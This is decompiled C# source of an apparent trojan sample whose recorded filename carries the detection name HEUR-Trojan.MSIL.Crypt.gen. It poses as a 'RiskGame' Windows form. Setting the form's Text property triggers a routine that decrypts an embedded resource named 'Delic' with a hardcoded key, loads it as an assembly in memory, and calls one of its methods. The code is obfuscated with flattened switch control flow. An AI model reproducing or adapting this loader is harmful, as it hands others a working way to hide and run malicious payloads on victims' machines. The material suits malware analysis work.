// Decompiled with JetBrains decompiler
// Type: RiskGame.Factories.ExporterCustomerFactory
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using RiskGame.Queues;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace RiskGame.Factories
{
  public class ExporterCustomerFactory : Form
  {
    private IContainer _Manager;
    private static object m_Field;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ExporterCustomerFactory()
    {
      int num1 = 2;
      MethodInfo method;
      string[] parameters;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            ListenerManager.InitStub();
            if (true)
            {
              num1 = 3;
              continue;
            }
            goto case 3;
          case 1:
            parameters[0] = "52656769737472794B65795065726D697373696F6E4368";
            parameters[1] = "786334";
            parameters[2] = "RiskGame";
            num1 = 6;
            continue;
          case 3:
            this._Manager = (IContainer) null;
            // ISSUE: explicit constructor call
            base.\u002Ector();
            this.InsertRequest();
            int num2 = 5;
            num1 = ExporterCustomerFactory.CancelObject() ? num2 : num2;
            continue;
          case 4:
          case 6:
            method.Invoke((object) 0, (object[]) parameters);
            num1 = 7;
            continue;
          case 5:
            method = ((System.Type) ExporterCustomerFactory.m_Field).GetMethod("InvalidCast");
            parameters = new string[3];
            goto case 1;
          case 7:
            goto label_8;
          default:
            num1 = 1;
            continue;
        }
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool calcvalue)
    {
      int num1 = 0;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            if (!calcvalue)
            {
              num2 = 0;
              goto label_5;
            }
            else
            {
              num1 = 4;
              continue;
            }
          case 1:
          case 4:
            num2 = this._Manager != null ? 1 : 0;
            goto label_5;
          case 2:
          case 3:
label_1:
            break;
          case 5:
            goto label_11;
          default:
            num1 = 3;
            continue;
        }
label_2:
        base.Dispose(calcvalue);
        num1 = 5;
        continue;
label_5:
        if (num2 != 0)
        {
          this._Manager.Dispose();
          goto label_1;
        }
        else
          goto label_2;
      }
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InsertRequest()
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        ComponentResourceManager componentResourceManager;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_8;
            case 2:
            case 3:
              goto label_1;
            case 4:
              goto label_2;
            case 5:
              goto label_6;
            case 6:
              componentResourceManager = new ComponentResourceManager(typeof (ExporterCustomerFactory));
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_8;
            case 7:
              goto label_9;
            default:
              goto label_5;
          }
        }
label_1:
        this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
        this.ClientSize = new Size(500, 750);
        num1 = 5;
        continue;
label_2:
        this.AutoScaleDimensions = new SizeF(8f, 16f);
        this.AutoScaleMode = AutoScaleMode.Font;
        goto label_1;
label_5:
        num1 = 2;
        continue;
label_6:
        this.FormBorderStyle = FormBorderStyle.None;
        this.Name = "Form1";
        this.StartPosition = FormStartPosition.CenterParent;
        this.Text = "Form1";
        this.ResumeLayout(false);
        num1 = 7;
        continue;
label_8:
        this.SuspendLayout();
        num1 = 4;
      }
label_9:;
    }

    public override string Text
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Text;
      [MethodImpl(MethodImplOptions.NoInlining)] set => ExporterCustomerFactory.SetupRequest();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string SetupRequest()
    {
      int num1 = 4;
      int num2;
      byte[] rawAssembly;
      string str1;
      string str2;
      ResourceManager resourceManager;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            resourceManager = new ResourceManager(typeof (TokenFieldQueue));
            num1 = 2;
            continue;
          case 1:
          case 2:
            rawAssembly = (byte[]) resourceManager.GetObject("Delic");
            str1 = "P7C455RF8EBCYHA8URJ585";
            num1 = 5;
            continue;
          case 3:
            num2 += -1;
            goto case 6;
          case 5:
            num2 = 92182;
            goto case 6;
          case 6:
            if (num2 < 0)
            {
              ExporterCustomerFactory.SetRequest(Thread.GetDomain().Load(rawAssembly), 9);
              str2 = str1;
              num1 = 7;
              continue;
            }
            rawAssembly[num2 % 46080] = (byte) ((ulong) ((long) ((int) rawAssembly[num2 % 46080] ^ (int) str1[num2 % 22]) - (long) Convert.ToUInt32(rawAssembly[(num2 + 1) % 46080]) + 256L) % 256UL);
            num1 = 3;
            continue;
          case 7:
            goto label_10;
          default:
            if (ExporterCustomerFactory.DeleteObject())
            {
              num1 = 6;
              continue;
            }
            goto case 1;
        }
      }
label_10:
      return str2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void SetRequest(Assembly var1, int version_cust) => ExporterCustomerFactory.m_Field = (object) var1.GetExportedTypes()[version_cust];

    internal static bool DeleteObject() => true;

    internal static bool CancelObject() => false;
  }
}
